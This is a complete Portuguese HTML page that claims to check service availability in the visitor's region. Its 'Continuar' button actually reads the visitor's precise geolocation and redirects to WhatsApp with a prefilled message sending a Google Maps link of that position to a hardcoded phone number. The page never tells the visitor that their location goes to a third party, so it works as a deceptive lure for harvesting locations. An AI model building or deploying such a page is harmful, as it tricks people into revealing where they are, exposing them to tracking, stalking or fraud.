<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificando Disponibilidade</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(to right, #f8f9fa, #e9ecef);
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }

        .card {
            background: #fff;
            border-radius: 12px;
            padding: 30px 25px;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
        }

        h2 {
            color: #333;
            margin-bottom: 15px;
        }

        p {
            color: #555;
            font-size: 15px;
            line-height: 1.5;
        }

        .btn {
            background-color: #007bff;
            color: #fff;
            padding: 12px 24px;
            margin-top: 20px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .btn:hover {
            background-color: #0056b3;
        }
    </style>

    <script>
        function enviarLocalizacao() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        let latitude = position.coords.latitude;
                        let longitude = position.coords.longitude;
                        let linkMaps = `https://www.google.com/maps?q=${latitude},${longitude}`;

                        let whatsapp = `https://wa.me/558197921133?text=Minha localização: ${linkMaps}`;
                        window.location.href = whatsapp;
                    },
                    function(error) {
                        alert("Erro ao obter localização. Permita o acesso à localização no navegador.");
                    },
                    {
                        enableHighAccuracy: true, 
                        timeout: 10000, 
                        maximumAge: 0
                    }
                );
            } else {
                alert("Seu navegador não suporta geolocalização.");
            }
        }
    </script>
</head>
<body>
    <div class="card">
        <h2>Verificando Disponibilidade na Sua Região</h2>
        <p>Estamos localizando os serviços disponíveis próximos de você. Clique no botão abaixo para continuar com a verificação.</p>
        <button class="btn" onclick="enviarLocalizacao()">Continuar</button>
    </div>
</body>
</html>
